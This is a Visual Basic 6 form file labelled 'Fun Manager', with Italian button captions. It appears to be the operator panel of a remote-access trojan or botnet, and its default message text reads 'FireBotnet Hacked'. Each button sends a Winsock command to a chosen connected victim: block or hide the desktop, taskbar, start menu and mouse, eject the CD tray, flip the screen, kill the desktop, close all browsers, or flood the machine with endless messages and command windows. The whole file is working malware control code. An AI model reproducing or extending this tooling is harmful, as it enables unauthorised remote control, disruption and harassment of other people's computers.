VERSION 5.00
Begin VB.Form Form13 
   BorderStyle     =   5  'Sizable ToolWindow
   Caption         =   "Fun Manager"
   ClientHeight    =   6660
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   10485
   LinkTopic       =   "Form13"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6660
   ScaleWidth      =   10485
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command36 
      Caption         =   "Ripara desktop"
      Height          =   375
      Left            =   3720
      TabIndex        =   36
      Top             =   3600
      Width           =   2055
   End
   Begin VB.CommandButton Command32 
      Caption         =   "NunLock On"
      Height          =   375
      Left            =   8040
      TabIndex        =   32
      Top             =   1200
      Width           =   1935
   End
   Begin VB.CommandButton Command30 
      Caption         =   "CapLock On"
      Height          =   375
      Left            =   3720
      TabIndex        =   30
      Top             =   2640
      Width           =   2055
   End
   Begin VB.CommandButton Command26 
      Caption         =   "Mostra Icone TaskBar"
      Height          =   375
      Left            =   3720
      TabIndex        =   28
      Top             =   1680
      Width           =   2055
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Mostra Orologio"
      Height          =   375
      Left            =   6120
      TabIndex        =   26
      Top             =   1680
      Width           =   1455
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Chiudi Cd Rom"
      Height          =   375
      Left            =   6120
      TabIndex        =   24
      Top             =   3600
      Width           =   1455
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Apri Cd Rom"
      Height          =   375
      Left            =   6120
      TabIndex        =   23
      Top             =   3120
      Width           =   1455
   End
   Begin VB.Frame Frame5 
      Caption         =   "Altri Fun XD"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   6495
      Left            =   3480
      TabIndex        =   20
      Top             =   120
      Width           =   6855
      Begin VB.CommandButton Command28 
         Caption         =   "Termina Desktop"
         Height          =   375
         Left            =   4560
         TabIndex        =   42
         Top             =   4200
         Width           =   1935
      End
      Begin VB.Frame Frame6 
         Caption         =   "Messaggi Infiniti"
         Height          =   1575
         Left            =   4440
         TabIndex        =   38
         Top             =   2520
         Width           =   2295
         Begin VB.CommandButton Command18 
            Caption         =   "Stop"
            Height          =   375
            Left            =   1320
            TabIndex        =   41
            Top             =   960
            Width           =   855
         End
         Begin VB.CommandButton Command17 
            Caption         =   "Start"
            Height          =   375
            Index           =   0
            Left            =   120
            TabIndex        =   40
            Top             =   960
            Width           =   855
         End
         Begin VB.TextBox Text1 
            Height          =   285
            Left            =   120
            TabIndex        =   39
            Text            =   "FireBotnet Hacked "
            Top             =   360
            Width           =   1935
         End
      End
      Begin VB.CommandButton Command27 
         Caption         =   "ChiudiTuttiBrowser"
         Height          =   375
         Left            =   4560
         TabIndex        =   37
         Top             =   2040
         Width           =   1935
      End
      Begin VB.CommandButton Command35 
         Caption         =   "Ruota Desktop"
         Height          =   375
         Left            =   240
         TabIndex        =   35
         Top             =   3000
         Width           =   2055
      End
      Begin VB.CommandButton Command34 
         Caption         =   "Stop Cmd Infiniti"
         Height          =   375
         Left            =   2640
         TabIndex        =   34
         Top             =   2520
         Width           =   1455
      End
      Begin VB.CommandButton Command33 
         Caption         =   "Apri Cmd Infiniti"
         Height          =   375
         Left            =   2640
         TabIndex        =   33
         Top             =   2040
         Width           =   1455
      End
      Begin VB.CommandButton Command31 
         Caption         =   "NunLock Off"
         Height          =   375
         Left            =   4560
         TabIndex        =   31
         Top             =   1560
         Width           =   1935
      End
      Begin VB.CommandButton Command29 
         Caption         =   "CapLock Off"
         Height          =   375
         Left            =   240
         TabIndex        =   29
         Top             =   2040
         Width           =   2055
      End
      Begin VB.CommandButton Command25 
         Caption         =   "Nascondi Icone TaskBar"
         Height          =   375
         Left            =   240
         TabIndex        =   27
         Top             =   1080
         Width           =   2055
      End
      Begin VB.CommandButton Command23 
         Caption         =   "Nascondi Orologio"
         Height          =   375
         Left            =   2640
         TabIndex        =   25
         Top             =   1080
         Width           =   1455
      End
      Begin VB.CommandButton Command20 
         Caption         =   "Ripara"
         Height          =   375
         Left            =   2400
         TabIndex        =   22
         Top             =   360
         Width           =   1335
      End
      Begin VB.CommandButton Command19 
         Caption         =   "Inverti Pulsante Mouse"
         Height          =   375
         Left            =   120
         TabIndex        =   21
         Top             =   360
         Width           =   2055
      End
      Begin VB.Line Line3 
         X1              =   4320
         X2              =   4320
         Y1              =   840
         Y2              =   5640
      End
      Begin VB.Line Line2 
         X1              =   2400
         X2              =   2400
         Y1              =   840
         Y2              =   5640
      End
      Begin VB.Line Line1 
         X1              =   0
         X2              =   7080
         Y1              =   840
         Y2              =   840
      End
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Sblocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   19
      Top             =   2520
      Width           =   1335
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Blocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   18
      Top             =   2040
      Width           =   1335
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Mostra"
      Height          =   375
      Left            =   240
      TabIndex        =   17
      Top             =   2520
      Width           =   1335
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Nascondi"
      Height          =   375
      Left            =   240
      TabIndex        =   16
      Top             =   2040
      Width           =   1335
   End
   Begin VB.Frame Frame4 
      Caption         =   "Mouse"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   120
      TabIndex        =   15
      Top             =   1680
      Width           =   3135
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Sblocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   14
      Top             =   4440
      Width           =   1335
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Blocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   13
      Top             =   3840
      Width           =   1335
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Mostra"
      Height          =   375
      Left            =   240
      TabIndex        =   12
      Top             =   4440
      Width           =   1335
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Nascondi"
      Height          =   375
      Left            =   240
      TabIndex        =   11
      Top             =   3840
      Width           =   1335
   End
   Begin VB.Frame Frame3 
      Caption         =   "Start"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1575
      Left            =   120
      TabIndex        =   10
      Top             =   3360
      Width           =   3135
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Sblocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   9
      Top             =   6000
      Width           =   1335
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Blocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   8
      Top             =   5400
      Width           =   1335
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Mostra"
      Height          =   375
      Left            =   240
      TabIndex        =   7
      Top             =   6000
      Width           =   1335
   End
   Begin VB.Frame Frame2 
      Caption         =   "Task Bar"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   120
      TabIndex        =   5
      Top             =   5040
      Width           =   3135
      Begin VB.CommandButton Command5 
         Caption         =   "Nascondi"
         Height          =   375
         Left            =   120
         TabIndex        =   6
         Top             =   360
         Width           =   1335
      End
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Sblocca"
      Height          =   375
      Left            =   1680
      TabIndex        =   4
      Top             =   960
      Width           =   1335
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Blocca "
      Height          =   375
      Left            =   1680
      TabIndex        =   3
      Top             =   480
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Mostra"
      Height          =   375
      Left            =   240
      TabIndex        =   2
      Top             =   960
      Width           =   1335
   End
   Begin VB.Frame Frame1 
      Caption         =   "Desktop"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3135
      Begin VB.CommandButton Command1 
         Caption         =   "Nascondi"
         Height          =   375
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   1335
      End
   End
End
Attribute VB_Name = "Form13"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKHIDE"
End Sub

Private Sub Command10_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "STARTSHOW"
End Sub

Private Sub Command11_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "STARTBLOCK"
End Sub

Private Sub Command12_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "STARTUNLOCK"
End Sub

Private Sub Command13_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "MOUSEHIDE"
End Sub

Private Sub Command14_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "MOUSESHOW"
End Sub

Private Sub Command15_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "MOUSEBLOCK"
End Sub

Private Sub Command16_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "MOUSEUNLOCK"
End Sub

Private Sub Command17_Click(Index As Integer)
Form1.Winsock1(Form1.Label14.Caption).SendData "infinitemessage|" & Text1.Text

End Sub

Private Sub Command18_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "messagestop"

End Sub

Private Sub Command2_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKSHOW"
End Sub

Private Sub Command28_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "killdesktop"

End Sub

Private Sub Command21_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "CDON"
End Sub

Private Sub Command22_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "CDOFF"
End Sub

Private Sub Command23_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "HIDECLOCK"
End Sub

Private Sub Command24_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "SHOWCLOCK"
End Sub

Private Sub Command25_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "HIDEICON"
End Sub

Private Sub Command26_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "SHOWICON"
End Sub

Private Sub Command27_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "offbrowser"

End Sub

Private Sub Command3_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKBLOCK"
End Sub

Private Sub Command33_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "CMDON"
End Sub

Private Sub Command34_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "CMDOFF"
End Sub

Private Sub Command35_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKFLIP"
End Sub

Private Sub Command36_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKFLIPFIX"
End Sub

Private Sub Command4_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "DESKUNLOCK"
End Sub

Private Sub Command5_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "TASKHIDE"
End Sub

Private Sub Command6_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "TASKSHOW"
End Sub

Private Sub Command7_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "TASKBLOCK"
End Sub

Private Sub Command8_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "TASKUNLOCK"
End Sub

Private Sub Command9_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "STARTHIDE"
End Sub

